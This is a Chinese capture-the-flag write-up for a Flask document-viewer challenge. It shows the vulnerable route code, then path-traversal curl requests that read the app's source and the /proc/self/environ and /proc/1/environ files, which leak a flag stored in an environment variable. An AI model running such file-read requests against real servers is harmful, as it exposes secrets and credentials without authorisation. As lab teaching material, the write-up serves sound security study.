# WP-[qsnctf] Flask文档查询 · 任意文件读取 + /proc 进程环境变量泄露

> 靶机：http://challenge.qsnctf.com:40381/
> 类型：Flask 任意文件读取 + /proc 目录信息泄露 + 假 flag 陷阱
> 结果：`flag{21336d08037d41cfb402723d732cb34f}`

---

## 一、信息收集

- 首页「欢迎，guest！」+ 表单 `/view?doc=`（查文档）
- `Server: Werkzeug/3.0.6 Python/3.8.20` = Flask 应用
- `Vary: Cookie` 提示有 session 机制

## 二、源码审计（先读 app.py）

`/view?doc=../../app.py` 直接读到源码，核心逻辑：

```python
@app.route('/view')
def view_doc():
    doc = request.args.get('doc', 'test.txt')
    base_dir = '/app/static/docs'
    filepath = os.path.realpath(os.path.join(base_dir, doc))   # ① 路径拼接 + realpath
    if filepath == '/flag':                                     # ② 只拦 /flag 精确匹配
       return "非法路径！"
    try:
        with open(filepath, 'r') as f:                          # ③ 任意文件读取
            content = f.read()
        return f"<pre>{content}</pre>"
    except:
        return "文档不存在！"
```

**漏洞**：`doc` 是绝对路径时，`join(base_dir, doc)` 直接变成绝对路径；`..` 也能穿越。**只拦 `filepath == '/flag'` 精确匹配**，其他任意文件都能读。

## 三、找 flag（核心）

读 `/proc/self/environ` 看到 `FLAG=no_FLAG`（**假线索**）——但真正的 flag 在**父进程 PID 1** 的环境变量里：

```bash
curl "http://challenge.qsnctf.com:40381/view?doc=/proc/1/environ"
# → FLAG=flag{21336d08037d41cfb402723d732cb34f}
```

**为什么是 /proc/1/environ**：Docker 里 PID 1 是启动脚本（entrypoint），它 export 了真 FLAG，再启动 Flask 子进程时把 FLAG 改成了 `no_FLAG`。所以：
- `/proc/self/environ`（Flask 进程）→ `FLAG=no_FLAG` 假
- `/proc/1/environ`（父进程）→ 真 flag

## 四、完整命令

```bash
# ① 读源码
curl "http://靶机/view?doc=/app/app.py"
# ② 读自己进程环境（假 flag）
curl "http://靶机/view?doc=/proc/self/environ"
# ③ 读父进程环境（真 flag）
curl "http://靶机/view?doc=/proc/1/environ"
```

---

## 五、复盘

1. **任意文件读取**：`realpath(join(base, doc))`，doc 传绝对路径或 `../../` 穿越；只拦 `/flag` 精确匹配 = 其他都能读。
2. **/proc 三板斧**（Linux 信息泄露核心）：
   | 文件 | 泄露什么 |
   |---|---|
   | `/proc/self/environ` | 当前进程环境变量 |
   | `/proc/1/environ` | PID 1（父/启动进程）环境变量 |
   | `/proc/self/cmdline` | 当前进程启动命令 |
3. **假 flag 陷阱**：`FLAG=no_FLAG` 是障眼法，真值在父进程。Docker 多进程里 `self` ≠ `1`，环境变量可能不同。
4. **SSTI 是干扰项**：源码里 `/` 路由 username 拼进 `render_template_string`（SSTI 点），`secret_key` 也从环境变量读（`Dark_Flame`）——看着像 SSTI 题，但文件读取一条路就通，SSTI 反而是弯路。

> 关联：Web笔记10-文件包含LFI（文件读取）、Web笔记18-PHP伪协议（读源码）；本题是 Python 版「任意文件读取 + /proc 泄露」。
